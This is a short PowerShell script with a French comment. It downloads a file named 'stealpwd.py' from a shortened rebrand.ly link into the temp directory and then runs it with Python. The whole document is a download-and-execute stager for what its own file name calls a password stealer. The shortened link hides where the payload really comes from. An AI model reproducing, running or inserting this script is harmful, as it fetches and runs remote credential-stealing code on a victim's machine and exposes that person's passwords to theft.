$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://rebrand.ly/iab05iw", "$env:temp\stealpwd.py")

# Exécuter le script Python dans une fenêtre de console
Start-Process -FilePath "python3" -ArgumentList "$env:temp\stealpwd.py" -Wait
